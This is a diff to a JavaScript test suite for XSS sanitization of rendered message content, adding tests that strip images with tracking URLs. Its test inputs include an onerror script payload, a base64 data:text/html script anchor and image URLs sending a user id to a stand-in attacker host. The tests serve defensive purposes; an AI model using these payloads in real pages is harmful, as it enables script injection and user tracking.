@@ -22,17 +22,24 @@ describe('MessageContent XSS sanitization', () => {
 		expect(el.innerHTML.toLowerCase()).not.toContain('<script');
 	});
 
-	it('removes onerror (and any on* handler) from <img>', () => {
+	it('strips image elements instead of allowing their handlers or network requests', () => {
 		const el = renderContent('<img src=x onerror="alert(1)">');
-		const img = el.querySelector('img');
-		// Either the img is dropped, or it survives with NO event-handler attribute.
-		if (img) {
-			expect(img.hasAttribute('onerror')).toBe(false);
-			for (const attr of img.getAttributeNames()) {
-				expect(attr.startsWith('on')).toBe(false);
-			}
-		}
+		expect(el.querySelector('img')).toBeNull();
 		expect(el.innerHTML.toLowerCase()).not.toContain('onerror');
+	});
+
+	it('strips markdown and raw HTML images with attacker-controlled URLs', () => {
+		const el = renderContent(
+			[
+				'![tracking pixel](https://attacker.example/pixel.png?user=123)',
+				'<img src="//attacker.example/protocol-relative.png" alt="tracker">',
+				'<img src="/api/quota" alt="same-origin request">'
+			].join('\n')
+		);
+
+		expect(el.querySelector('img')).toBeNull();
+		expect(el.innerHTML).not.toContain('attacker.example');
+		expect(el.innerHTML).not.toContain('/api/quota');
 	});
 
 	it('neutralizes javascript: href from a markdown link', () => {
@@ -75,10 +82,8 @@ describe('MessageContent XSS sanitization', () => {
 	});
 
 	it('strips data:text/html from a navigable anchor href', () => {
-		// A data:text/html URI is dangerous only in a navigable context (an anchor
-		// or iframe the browser will load as a document). DOMPurify strips it from
-		// href. (In an <img src> it is inert — the browser treats it as image data,
-		// never executing HTML — so that case is intentionally not a concern here.)
+		// A data:text/html URI is dangerous in a navigable context. DOMPurify strips
+		// it from href; image elements are independently forbidden above.
 		const el = renderContent(
 			'<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>'
 		);
